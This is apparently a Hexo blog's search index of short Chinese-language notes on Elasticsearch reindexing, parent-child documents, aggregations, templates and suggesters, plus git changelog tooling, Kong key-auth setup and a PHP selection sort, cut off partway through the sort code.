<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>elasticsearch reindex</title>
      <link href="/2019/08/29/elk/reindex/"/>
      <url>/2019/08/29/elk/reindex/</url>
      
        <content type="html"><![CDATA[<h2 id="适用reindex的情景"><a href="#适用reindex的情景" class="headerlink" title="适用reindex的情景"></a>适用reindex的情景</h2><h3 id="1-mapping发生变更-字段类型变更-分词器及字典更新"><a href="#1-mapping发生变更-字段类型变更-分词器及字典更新" class="headerlink" title="1. mapping发生变更 字段类型变更 分词器及字典更新"></a>1. mapping发生变更 字段类型变更 分词器及字典更新</h3><h3 id="2-setting发生变更-主分片数量发生变更"><a href="#2-setting发生变更-主分片数量发生变更" class="headerlink" title="2. setting发生变更 主分片数量发生变更"></a>2. setting发生变更 主分片数量发生变更</h3><h3 id="3-数据迁移"><a href="#3-数据迁移" class="headerlink" title="3. 数据迁移"></a>3. 数据迁移</h3><h2 id="1-update-by-query-在现有索引上重建"><a href="#1-update-by-query-在现有索引上重建" class="headerlink" title="1. update by query 在现有索引上重建"></a>1. update by query 在现有索引上重建</h2><ul><li>对已有增加增加子字段/增加分词器<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"properties"</span>: &#123;</span><br><span class="line">    <span class="attr">"date"</span>:&#123;</span><br><span class="line">      <span class="attr">"type"</span>:<span class="string">"keyword"</span>,  </span><br><span class="line">      <span class="attr">"fields"</span>: &#123;</span><br><span class="line">        <span class="attr">"indate"</span>:&#123;</span><br><span class="line">          <span class="attr">"type"</span>:<span class="string">"text"</span>,</span><br><span class="line">          <span class="attr">"analyzer"</span>:<span class="string">"english"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>然后执行</p><figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="code"><pre><span class="line">POST /my_blogs/_update_by_query</span><br></pre></td></tr></table></figure><h2 id="2-reindex-在其他索引上重建"><a href="#2-reindex-在其他索引上重建" class="headerlink" title="2. reindex 在其他索引上重建"></a>2. reindex 在其他索引上重建</h2><p>需要开启白名单并重启节点</p><figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="code"><pre><span class="line">POST _reindex</span><br><span class="line">&#123;</span><br><span class="line">  "source": &#123;</span><br><span class="line">    "index": "my_blogs"</span><br><span class="line">  &#125;,</span><br><span class="line">  "dest": &#123;</span><br><span class="line">    "index": "new_blogs"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时还支持 筛选数据重建/跨集群重建</p><p>如果重建耗时较长 还支持通过任务id查看进度<br>更多参数详见官方文档</p><p><em>以上要求mapping的_source为enabled</em></p>]]></content>
      
      
      <categories>
          
          <category> elasticsearch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> elasticsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>elasticsearch 父子文档</title>
      <link href="/2019/08/28/elk/%E7%88%B6%E5%AD%90%E6%96%87%E6%A1%A3/"/>
      <url>/2019/08/28/elk/%E7%88%B6%E5%AD%90%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<p>父子文档 适用于大量更新的操作</p><ol><li><p>定义mappings 设置文档父子关系</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">    <span class="attr">"properties"</span>: &#123;</span><br><span class="line">        <span class="attr">"blog_comments_relation"</span>:&#123;</span><br><span class="line">          <span class="attr">"type"</span>:<span class="string">"join"</span>,</span><br><span class="line">          <span class="attr">"relations"</span>:&#123;</span><br><span class="line">            <span class="attr">"blog"</span>:<span class="string">"comments"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"title"</span>:&#123;</span><br><span class="line">          <span class="attr">"type"</span>:<span class="string">"text"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"content"</span>:&#123;</span><br><span class="line">          <span class="attr">"type"</span>:<span class="string">"keyword"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>索引数据</p></li></ol><ul><li><p>索引父文档 明确文档id</p><figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="code"><pre><span class="line">PUT /my_blogs/_doc/blog_id_1</span><br><span class="line">&#123;</span><br><span class="line">  "title":"super book",</span><br><span class="line">  "content":"dfslkfjdsafdskla;klf",</span><br><span class="line">  "blog_contents_relation":&#123;</span><br><span class="line">    "name":"blog"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>索引子文当 需指定其父文档id</p><figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="code"><pre><span class="line">PUT /my_blogs/_doc/comments_id_1?routing=blog_id_1</span><br><span class="line">&#123;</span><br><span class="line">  "comments":"22222222222",</span><br><span class="line">  "username":"user2",</span><br><span class="line">  "blog_contents_relation":&#123;</span><br><span class="line">    "name":"comments",</span><br><span class="line">    "parent":"blog_id_1"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>根据父id查询子文档</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>:&#123;</span><br><span class="line">    <span class="attr">"parent_id"</span>:&#123;</span><br><span class="line">      <span class="attr">"type"</span>:<span class="string">"comments"</span>,</span><br><span class="line">      <span class="attr">"id"</span>:<span class="string">"blog_id_1"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据子文档 查询父文档</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>:&#123;</span><br><span class="line">    <span class="attr">"has_child"</span>:&#123;</span><br><span class="line">      <span class="attr">"type"</span>:<span class="string">"comments"</span>,</span><br><span class="line">      <span class="attr">"query"</span>: &#123;</span><br><span class="line">        <span class="attr">"match"</span>: &#123;</span><br><span class="line">          <span class="attr">"username"</span>: <span class="string">"user1"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> elasticsearch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> elasticsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>elasticsearch aggs 范围</title>
      <link href="/2019/08/28/elk/aggs%20%E8%8C%83%E5%9B%B4/"/>
      <url>/2019/08/28/elk/aggs%20%E8%8C%83%E5%9B%B4/</url>
      
        <content type="html"><![CDATA[<h2 id="filter-多范围aggs"><a href="#filter-多范围aggs" class="headerlink" title="filter 多范围aggs"></a>filter 多范围aggs</h2><p>可以在一个查询内对多个范围的数据同时进行aggs<br>如下 对全局数据 以及满足filter条件的数据进行了aggs</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"aggs"</span>:&#123;</span><br><span class="line">      <span class="attr">"myFilter"</span>:&#123;</span><br><span class="line">        <span class="attr">"filter"</span>:&#123;</span><br><span class="line">            <span class="attr">"match"</span>: &#123;</span><br><span class="line">              <span class="attr">"a"</span>: <span class="string">"abc"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">          <span class="attr">"by_myfilter"</span>: &#123;</span><br><span class="line">            <span class="attr">"terms"</span>: &#123;</span><br><span class="line">              <span class="attr">"field"</span>: <span class="string">"d"</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"to_all_aggs"</span>:&#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"d"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="post-filter-对aggs的结果进行filter-返回命中的文档"><a href="#post-filter-对aggs的结果进行filter-返回命中的文档" class="headerlink" title="post filter 对aggs的结果进行filter 返回命中的文档"></a>post filter 对aggs的结果进行filter 返回命中的文档</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"aggs"</span>:&#123;</span><br><span class="line">      <span class="attr">"by_d"</span>: &#123;</span><br><span class="line">        <span class="attr">"terms"</span>: &#123;</span><br><span class="line">          <span class="attr">"field"</span>: <span class="string">"d"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"post_filter"</span>:&#123;</span><br><span class="line">      <span class="attr">"match"</span>: &#123;</span><br><span class="line">        <span class="attr">"a"</span>: <span class="string">"abc"</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="global-忽略query条件"><a href="#global-忽略query条件" class="headerlink" title="global 忽略query条件"></a>global 忽略query条件</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">   <span class="attr">"match"</span>: &#123;</span><br><span class="line">     <span class="attr">"FIELD"</span>: <span class="string">"TEXT"</span></span><br><span class="line">   &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"aggs"</span>:&#123;</span><br><span class="line">    <span class="attr">"by_field"</span>:&#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"d"</span>,</span><br><span class="line">        <span class="attr">"size"</span>: <span class="number">10</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"all"</span>:&#123;</span><br><span class="line">      <span class="attr">"global"</span>: &#123;&#125;,</span><br><span class="line">      <span class="attr">"aggs"</span>:&#123;</span><br><span class="line">          <span class="attr">"by_d"</span>:&#123;</span><br><span class="line">            <span class="attr">"terms"</span>: &#123;</span><br><span class="line">              <span class="attr">"field"</span>: <span class="string">""</span>,</span><br><span class="line">              <span class="attr">"size"</span>: <span class="number">10</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> elasticsearch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> elasticsearch </tag>
            
            <tag> aggs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>elasticsearch aggs方式</title>
      <link href="/2019/08/27/elk/aggs/"/>
      <url>/2019/08/27/elk/aggs/</url>
      
        <content type="html"><![CDATA[<p>以下内容基于ES7</p><p>a为text d为keyword  e为text(fielddata=true)</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">    <span class="attr">"properties"</span>: &#123;</span><br><span class="line">        <span class="attr">"a"</span>:&#123;</span><br><span class="line">          <span class="attr">"type"</span>:<span class="string">"text"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"d"</span>:&#123;</span><br><span class="line">          <span class="attr">"type"</span>:<span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"e"</span>:&#123;</span><br><span class="line">          <span class="attr">"type"</span>:<span class="string">"text"</span>,</span><br><span class="line">          <span class="attr">"fielddata"</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-terms-aggs"><a href="#1-terms-aggs" class="headerlink" title="1. terms aggs"></a>1. terms aggs</h3><ul><li><p>对精确值keyword(不可分词)字段的分组 keyword或text.keyword</p></li><li><p>对设置fielddata=true的text字段进行aggs 将对字段值进行分词后的结果进行aggs<br>进行aggs查询</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"aggs"</span>:&#123;</span><br><span class="line">    <span class="attr">"txt"</span>:&#123;</span><br><span class="line">      <span class="attr">"terms"</span>:&#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"a.keyword"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"k"</span>:&#123;</span><br><span class="line">      <span class="attr">"terms"</span>:&#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"d"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"kf"</span>:&#123;</span><br><span class="line">      <span class="attr">"terms"</span>:&#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"e"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>top_hits 获取aggs后bucket中命中的key的文档</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"aggs"</span>:&#123;</span><br><span class="line">      <span class="attr">"by_e"</span>:&#123;</span><br><span class="line">        <span class="attr">"terms"</span>:&#123;</span><br><span class="line">            <span class="attr">"field"</span>:<span class="string">"e"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">          <span class="attr">"most_group"</span>: &#123;</span><br><span class="line">            <span class="attr">"top_hits"</span>: &#123;</span><br><span class="line">              <span class="attr">"size"</span>: <span class="number">10</span>,</span><br><span class="line">              <span class="attr">"sort"</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="attr">"i"</span>:&#123;</span><br><span class="line">                    <span class="attr">"order"</span>: <span class="string">"desc"</span></span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>性能 打开分词字段的eager_global_ordinals(在mapping中的type下面添加)*</p><h3 id="2-metric-aggs-分组统计"><a href="#2-metric-aggs-分组统计" class="headerlink" title="2. metric aggs 分组统计"></a>2. metric aggs 分组统计</h3></li><li><p>min/max/avg/sum/stats </p></li><li><p>cardinate 类似于mysql的count(distinct(字段))</p></li></ul><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"aggs"</span>:&#123;</span><br><span class="line">      <span class="attr">"count_distinct"</span>:&#123;</span><br><span class="line">        <span class="attr">"cardinality"</span>:&#123;</span><br><span class="line">            <span class="attr">"field"</span>:<span class="string">"e"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-range-aggs-区间范围分组"><a href="#3-range-aggs-区间范围分组" class="headerlink" title="3. range aggs 区间范围分组"></a>3. range aggs 区间范围分组</h3><h3 id="4-histogram-aggs-对指定范围内的等差区间进行aggs"><a href="#4-histogram-aggs-对指定范围内的等差区间进行aggs" class="headerlink" title="4. histogram aggs 对指定范围内的等差区间进行aggs"></a>4. histogram aggs 对指定范围内的等差区间进行aggs</h3><h3 id="5-pipeline-对terms嵌套metric的结果进行进一步metric"><a href="#5-pipeline-对terms嵌套metric的结果进行进一步metric" class="headerlink" title="5.pipeline  对terms嵌套metric的结果进行进一步metric"></a>5.pipeline  对terms嵌套metric的结果进行进一步metric</h3><ul><li>min_bucket/max_bucket/stats_bucket/avg_bucket/sum_bucket</li><li>derivative…</li></ul>]]></content>
      
      
      <categories>
          
          <category> elasticsearch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> elasticsearch </tag>
            
            <tag> aggs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>elasticsearch search template</title>
      <link href="/2019/08/26/elk/search%20template/"/>
      <url>/2019/08/26/elk/search%20template/</url>
      
        <content type="html"><![CDATA[<p>创建搜索模板</p><figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">POST</span> <span class="symbol">_scripts</span>/.kibana_1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"script"</span>:&#123;</span><br><span class="line">    <span class="string">"lang"</span>: <span class="string">"mustache"</span>,</span><br><span class="line">    <span class="string">"source"</span>:&#123;</span><br><span class="line">      <span class="string">"_source"</span>:[<span class="string">"name"</span>,<span class="string">"description"</span>,<span class="string">"color"</span>],</span><br><span class="line">      <span class="string">"size"</span>:<span class="number">20</span>,</span><br><span class="line">      <span class="string">"query"</span>:&#123;</span><br><span class="line">        <span class="string">"multi_match"</span>: &#123;</span><br><span class="line">          <span class="string">"query"</span>: <span class="string">"&#123;&#123;q&#125;&#125;"</span>,</span><br><span class="line">          <span class="string">"fields"</span>: [<span class="string">"name"</span>,<span class="string">"description"</span>]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看</span></span><br><span class="line">GET _scripts/<span class="string">.kibana_1</span></span><br><span class="line"><span class="comment"># 查看删除模板</span></span><br><span class="line">DELETE _scripts/<span class="string">.kibana_1</span></span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">POST searchTplA/_search/<span class="keyword">template</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"id"</span>:<span class="string">".kibana_1"</span>,</span><br><span class="line">  <span class="string">"params"</span>: &#123;</span><br><span class="line">    <span class="string">"search"</span>:<span class="string">"a"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> elasticsearch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> elasticsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>elasticsearch search suggest</title>
      <link href="/2019/08/26/elk/search%20suggest/"/>
      <url>/2019/08/26/elk/search%20suggest/</url>
      
        <content type="html"><![CDATA[<h3 id="1-term-suggest-常用于拼写错误"><a href="#1-term-suggest-常用于拼写错误" class="headerlink" title="1. term suggest 常用于拼写错误"></a>1. term suggest 常用于拼写错误</h3><figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">POST /kiban<span class="built_in">a_sample</span>_dat<span class="built_in">a_logs</span>/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"suggest"</span>:&#123;</span><br><span class="line">    <span class="string">"term-suggestion"</span>:&#123;</span><br><span class="line">      <span class="string">"text"</span>:<span class="string">"elastia"</span>,</span><br><span class="line">      <span class="string">"term"</span>:&#123;</span><br><span class="line">        <span class="string">"suggest_mode"</span>:<span class="string">"popular"</span>,</span><br><span class="line">        <span class="string">"field"</span>:<span class="string">"url"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>result:</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"took"</span> : <span class="number">65</span>,</span><br><span class="line">  <span class="attr">"timed_out"</span> : <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"_shards"</span> : &#123;</span><br><span class="line">    <span class="attr">"total"</span> : <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"successful"</span> : <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"skipped"</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"failed"</span> : <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"hits"</span> : &#123;</span><br><span class="line">    <span class="attr">"total"</span> : &#123;</span><br><span class="line">      <span class="attr">"value"</span> : <span class="number">0</span>,</span><br><span class="line">      <span class="attr">"relation"</span> : <span class="string">"eq"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"max_score"</span> : <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"hits"</span> : [ ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"suggest"</span> : &#123;</span><br><span class="line">    <span class="attr">"term-suggestion"</span> : [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"text"</span> : <span class="string">"elastia"</span>,</span><br><span class="line">        <span class="attr">"offset"</span> : <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"length"</span> : <span class="number">7</span>,</span><br><span class="line">        <span class="attr">"options"</span> : [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"text"</span> : <span class="string">"elastic"</span>,</span><br><span class="line">            <span class="attr">"score"</span> : <span class="number">0.85714287</span>,</span><br><span class="line">            <span class="attr">"freq"</span> : <span class="number">2724</span></span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>suggest_mode</p><ul><li>missing 如索引中已存在,就不提供建议</li><li>popular 推荐出现频率更高的词</li><li>always 无论是否存在 都提供建议 </li></ul><h3 id="2-phrase-suggest"><a href="#2-phrase-suggest" class="headerlink" title="2. phrase suggest"></a>2. phrase suggest</h3><h3 id="3-completion-suggest-自动不全"><a href="#3-completion-suggest-自动不全" class="headerlink" title="3.completion suggest 自动不全"></a>3.completion suggest 自动不全</h3><p>需要先定义mapping 字段设置type为 completion</p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">PUT completion_index_a</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"mappings"</span>: &#123;</span><br><span class="line">    <span class="string">"properties"</span>: &#123;</span><br><span class="line">      <span class="string">"yourfield"</span>:&#123;</span><br><span class="line">        <span class="string">"type"</span>: <span class="string">"completion"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>result</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"acknowledged"</span> : <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"shards_acknowledged"</span> : <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"index"</span> : <span class="string">"completion_index_a"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">POST <span class="regexp">/completion_index_a/</span>_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"suggest"</span>:&#123;</span><br><span class="line">    <span class="string">"comp-suggestion"</span>:&#123;</span><br><span class="line">      <span class="string">"prefix"</span>:<span class="string">"n"</span>,</span><br><span class="line">      <span class="string">"completion"</span>:&#123;</span><br><span class="line">        <span class="string">"field"</span>:<span class="string">"yourfield"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-context-suggest-上下文建议"><a href="#4-context-suggest-上下文建议" class="headerlink" title="4..context suggest 上下文建议"></a>4..context suggest 上下文建议</h3>]]></content>
      
      
      <categories>
          
          <category> elasticsearch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> elasticsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git changelog</title>
      <link href="/2019/08/26/git-changelog/"/>
      <url>/2019/08/26/git-changelog/</url>
      
        <content type="html"><![CDATA[<p>软件环境安装</p><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">npm <span class="keyword">install</span> commitizen -g <span class="comment"># 也可在项目根目录本地安装 --save-dev</span></span><br><span class="line">npm <span class="keyword">install</span> -g conventional-changelog-cli <span class="comment"># 也可在项目根目录本地安装 --save-dev</span></span><br></pre></td></tr></table></figure><p>配置</p><figure class="highlight q"><table><tr><td class="code"><pre><span class="line">commitizen init cz-conventional-changelog --<span class="built_in">save</span>-<span class="built_in">dev</span> --<span class="built_in">save</span>-exact</span><br></pre></td></tr></table></figure><p>如果出现报错(极大可能是node版本问题 可以切换node版本)<br>指定适配器</p><p>vim .czrc</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"path"</span>: <span class="string">"cz-conventional-changelog"</span>&#125;</span><br></pre></td></tr></table></figure><p>指定生成标准angular可选 angular/atom/…</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">conventional-changelog -<span class="selector-tag">p</span> angular -<span class="selector-tag">i</span> CHANGELOG<span class="selector-class">.md</span> -s</span><br><span class="line"></span><br><span class="line">git add .</span><br><span class="line">git cz</span><br></pre></td></tr></table></figure><p>释义</p><ul><li>feat 新功能</li><li>fix Bug修复</li><li>docs 文档更新</li><li>style 代码的格式，标点符号的更新</li><li>refactor 代码重构</li><li>perf 性能优化</li><li>test 测试更新</li><li>build 构建系统或者包依赖更新</li><li>ci CI 配置，脚本文件等更新</li><li>chore 非 src 或者 测试文件的更新</li><li>revert commit 回退</li></ul>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
            <tag> changelog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kong 使用</title>
      <link href="/2018/04/04/devops/kong-user/"/>
      <url>/2018/04/04/devops/kong-user/</url>
      
        <content type="html"><![CDATA[<p>kong 总体流程<br>创建接口-给接口添加验证插件-创建用户-给用户创建key</p><p>给接口添加验证插件<br>curl -X POST <a href="http://10.10.107.103:8001/apis/qzh/plugins" target="_blank" rel="noopener">http://10.10.107.103:8001/apis/qzh/plugins</a> -d “name=key-auth”<br>{“api_id”:”1b545af7-42ff-4143-8c70-5a4c323d1a41”,”id”:”8e104fce-5ceb-4a38-b6bf-f8fcfb8ad048”,”created_at”:1522828616000,”enabled”:true,”name”:”key-auth”,”config”:{“hide_credentials”:false,”anonymous”:””,”key_names”:[“apikey”],”key_in_body”:false}}</p><p>给用户创建key<br>curl -X POST <a href="http://10.10.107.103:8001/consumers/qzhuser/key-auth" target="_blank" rel="noopener">http://10.10.107.103:8001/consumers/qzhuser/key-auth</a> -d “key=qzhkey”<br>{“created_at”:1522828821000,”consumer_id”:”f2531e2f-c6ba-4f97-94e4-a9454b70bb95”,”key”:”qzhkey”,”id”:”33fc0bff-7f23-43bc-bf60-e6114f0b04ab”}</p>]]></content>
      
      
      
        <tags>
            
            <tag> kong </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithms_select</title>
      <link href="/2016/11/16/Algorithms-select/"/>
      <url>/2016/11/16/Algorithms-select/</url>
      
        <content type="html"><![CDATA[<h5 id="算法练习：选择排序"><a href="#算法练习：选择排序" class="headerlink" title="算法练习：选择排序"></a>算法练习：选择排序</h5><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">$arr</span> = [];</span></span><br><span class="line"><span class="keyword">for</span>(<span class="symbol">$</span>i=<span class="number">0</span>;<span class="symbol">$</span>i&lt;<span class="number">10</span>;<span class="symbol">$</span>i++)&#123;</span><br><span class="line"><span class="symbol">$</span>arr[] = mt_rand(<span class="number">1</span>,<span class="number">500</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"><span class="meta-keyword">$arr2</span> = $arr;</span></span><br><span class="line">echo <span class="string">'&lt;pre&gt;&lt;br/&gt;元数据:'</span>;</span><br><span class="line">print_r(<span class="symbol">$</span>arr);</span><br><span class="line">echo <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="meta"><span class="meta-keyword">$l</span> = 0;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$result</span> = [];</span></span><br><span class="line"></span><br><span class="line"># asc</span><br><span class="line"><span class="keyword">for</span>(<span class="symbol">$</span>i=<span class="number">0</span>;<span class="symbol">$</span>i&lt;count(<span class="symbol">$</span>arr);<span class="symbol">$</span>i++)&#123;</span><br><span class="line"><span class="symbol">$</span><span class="built-in">min</span> = <span class="symbol">$</span>arr[<span class="symbol">$</span>i];</span><br><span class="line"><span class="keyword">for</span>(<span class="symbol">$</span>j=<span class="symbol">$</span>i;<span class="symbol">$</span>j&lt;count(<span class="symbol">$</span>arr)<span class="number">-1</span>;<span class="symbol">$</span>j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="symbol">$</span><span class="built-in">min</span>&gt;<span class="symbol">$</span>arr[<span class="symbol">$</span>j+<span class="number">1</span>])&#123;</span><br><span class="line"><span class="symbol">$</span>tmp = <span class="symbol">$</span>arr[<span class="symbol">$</span>j+<span class="number">1</span>];</span><br><span class="line"><span class="symbol">$</span>arr[<span class="symbol">$</span>j+<span class="number">1</span>] = <span class="symbol">$</span><span class="built-in">min</span>;</span><br><span class="line"><span class="symbol">$</span><span class="built-in">min</span> = <span class="symbol">$</span>tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span 